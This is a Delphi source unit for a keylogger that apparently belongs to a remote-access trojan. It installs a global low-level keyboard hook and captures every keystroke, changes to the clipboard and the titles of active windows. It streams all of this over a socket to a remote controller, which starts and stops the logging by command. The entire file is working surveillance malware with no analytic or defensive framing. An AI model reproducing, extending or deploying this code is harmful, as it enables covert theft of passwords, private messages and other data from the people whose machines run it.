unit UnitKeyLogger;

interface

uses
  windows,messages,socketunit, unitshareddata, CompressionStreamUnit;

type
  pkbll = ^tKBDLLHOOKSTRUCT;
  tKBDLLHOOKSTRUCT = record
    vkCode: INTEGER;
    scancode: INTEGER;
    flags: INTEGER;
    time: INTEGER;
    dwExtraInfo: INTEGER;
  end;

const
  WH_KEYBOARD_LL = 13;

var
  HookHandle: THandle;
  LogSocket: TClientSocket;
  OldWindow: THandle;
  OldText: string;
  ShiftDown: Boolean;
  CapsDown: Boolean;


procedure ParseData(Socket: TClientSocket; Data: string); forward;

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'KeyLogger|' + Data);
end;

function IntToStr(I: integer): string;
begin
  Str(I, Result);
end;

function StrToInt(S: string): integer;
begin
  Val(S, Result, Result);
end;

function GetCaption(Handle: integer): string;
var
  Buf: array[0..255] of char;
begin
  GetWindowText(Handle,Buf,255);
  Result := Buf;
end;

function GetTime: string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wHour) + ':' + inttostr(MyTime.wMinute) + ':' + inttostr(MyTime.wSecond);
end;

function GetDate: string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wDay) + '\' + inttostr(MyTime.wMonth) + '\' + inttostr(MyTime.wYear);
end;

function GetClipBoardText: string;
var
  Data: THandle;
begin
  OpenClipboard(0);
  Data := GetClipboardData(CF_TEXT);
  try
    if Data <> 0 then
      Result := PChar(GlobalLock(Data))
    else
      Result := '';
  finally
    if Data <> 0 then GlobalUnlock(Data);
  end;
  CloseClipboard;
end;

{function ShiftDown: Boolean;
var
  State: TKeyboardState;
begin
  GetKeyboardState(State);
  Result := ((State[VK_SHIFT] and 128) <> 0);
end;

function CapsDown: Boolean;
var
  State: TKeyboardState;
begin
  GetKeyboardState(State);
  Result := ((State[VK_CAPITAL] and 128) <> 0);
end; }

function IsCapsLockOn : boolean;
begin
  Result := 0 <> (GetKeyState(VK_CAPITAL) and $01);
end;

function HookProc(nCode:Integer; wParam:Integer; var EventStrut: tKBDLLHOOKSTRUCT):Integer; stdcall;
var
  szletta:string;
  Charry: Array[0..1] of Char;
  VirtKey,ScanCode:Cardinal;
  KeyState:TKeyBoardState;
  nametext:Array[0..32] of Char;
  Text: string;
  i: byte;
  asciiResult: Integer;
  co: bool;
begin
  Result := CallNextHookEx(HookHandle,nCode,wParam,Integer(@EventStrut));

  CO := IsCapsLockOn;

  if nCode = HC_ACTION then begin

    //GetKeyboardState(KeyState);
    //ShiftDown := (KeyState[VK_SHIFT] = 1);
    //CapsDown := (KeyState[VK_CAPITAL] = 1);

    if (wParam <> WM_KEYUP)then begin

      VirtKey := EventStrut.vkCode;
      ScanCode := EventStrut.scancode;
      ScanCode := ScanCode shl 16;
      GetKeyNameText(ScanCode,nametext,sizeof(nametext));

      szletta := #0;
      fillchar(Charry,2,#0);



      if lstrlen(nametext) > 1 then begin
        if VirtKey = VK_SPACE then szletta := ' ' else szletta := '<specialkey>[' + nametext + ']</specialkey>'
      end else begin
        GetKeyboardState(KeyState);
        ToAscii(VirtKey,ScanCode, KeyState, Charry, 0);
        szletta := Charry;
        szletta := copy(szletta,1,1);
        //if CO then szletta := charupper(pchar(szletta));}
      end;


      Text := GetClipboardText;
      if OldText <> Text then begin
        SendData(LogSocket,'Clipboard|[' + GetDate + ' ' + GetTime + ']|' + Text);
        OldText := Text;
        OldWindow := 0;
      end;

      if OldWindow <> GetForeGroundWindow then begin
        SendData(LogSocket,'Caption|[' + GetDate + ' ' + GetTime + ']|' + GetCaption(GetForeGroundWindow));
        OldWindow := GetForeGroundWindow;
      end;

      if LogSocket <> nil then begin
        if LogSocket.Connected then begin
          SendData(LogSocket,'SingleKey|' + szletta);
        end else begin
          LogSocket := nil;
          UnHookWindowsHookEx(HookHandle);
          HookHandle := 0;
        end;
      end;

    end;
  end;
  //Result := CallNextHookEx(HookHandle,nCode,wParam,Integer(@EventStrut));

end;


procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Start' then begin
    LogSocket := Socket;
    SendData(Socket,'Status|Key Logger Enabled');
    OldWindow := 0;
    OldText := GetClipboardText;
    UnHookWindowsHookEx(HookHandle);
    HookHandle := SetWindowsHookEx(WH_KEYBOARD_LL, @HookProc, HInstance, 0);
  end;

  if Command = 'Stop' then begin
    SendData(Socket,'Status|Key Logger Disabled');
    LogSocket := nil;
    UnHookWindowsHookEx(HookHandle);
    HookHandle := 0;
  end;

end;


end.
